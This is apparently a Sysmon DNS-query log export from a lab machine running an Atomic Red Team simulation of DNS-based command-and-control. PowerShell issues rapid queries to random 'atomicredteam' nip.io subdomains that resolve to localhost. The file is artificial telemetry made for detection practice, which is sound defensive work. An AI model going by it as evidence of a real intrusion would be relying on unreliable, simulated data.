"2025-12-22 13:58:55.103 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166120,"Query: atomicredteam-70745.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.894","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.104 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166121,"Query: atomicredteam-548202.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.067","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.104 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166122,"Query: atomicredteam-679422.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.111","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.104 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166123,"Query: atomicredteam-808733.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.154","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.105 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166124,"Query: atomicredteam-849368.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.197","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.105 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166125,"Query: atomicredteam-737872.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.239","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.105 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166126,"Query: atomicredteam-428331.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.279","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.105 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166127,"Query: atomicredteam-471222.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.322","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.105 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166128,"Query: atomicredteam-564583.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.370","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.106 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166129,"Query: atomicredteam-557144.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.415","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.106 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166130,"Query: atomicredteam-568813.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.458","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.106 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166131,"Query: atomicredteam-49199.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.503","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.106 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166132,"Query: atomicredteam-732677.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.546","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.107 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166133,"Query: atomicredteam-459376.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.588","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.107 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166134,"Query: atomicredteam-9105.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.631","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.107 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166135,"Query: atomicredteam-666412.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.676","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.107 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166136,"Query: atomicredteam-428658.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.720","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.107 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166137,"Query: atomicredteam-473511.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.765","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.108 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166138,"Query: atomicredteam-352862.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.808","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.108 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166139,"Query: atomicredteam-653828.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.853","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:56.108 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166140,"Query: atomicredteam-555112.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.897","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.112 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166141,"Query: atomicredteam-257092.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.940","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.112 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166142,"Query: atomicredteam-857606.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:55.982","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.113 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166143,"Query: atomicredteam-760715.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.302","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.113 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166144,"Query: atomicredteam-404352.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.346","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.113 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166145,"Query: atomicredteam-536765.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.389","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.113 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166146,"Query: atomicredteam-677645.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.435","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.113 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166147,"Query: atomicredteam-568011.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.478","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166148,"Query: atomicredteam-893573.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.519","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166149,"Query: atomicredteam-181261.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.561","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166150,"Query: atomicredteam-269140.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.606","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166151,"Query: atomicredteam-716645.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.649","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166152,"Query: atomicredteam-382223.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.692","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166153,"Query: atomicredteam-884535.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.863","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166154,"Query: atomicredteam-195382.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.907","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166155,"Query: atomicredteam-382323.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.950","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166156,"Query: atomicredteam-567600.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:56.994","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:57.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166157,"Query: atomicredteam-692232.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.035","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166158,"Query: atomicredteam-893230.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.077","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166159,"Query: atomicredteam-354680.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.246","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166160,"Query: atomicredteam-149444.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.418","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.114 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166161,"Query: atomicredteam-574271.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.461","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166162,"Query: atomicredteam-24133.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.505","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166163,"Query: atomicredteam-792006.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.549","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166164,"Query: atomicredteam-621916.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.593","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166165,"Query: atomicredteam-473874.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.637","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.115 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166166,"Query: atomicredteam-365776.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.808","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166167,"Query: atomicredteam-157766.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.852","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:58.116 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166168,"Query: atomicredteam-328031.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:57.897","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
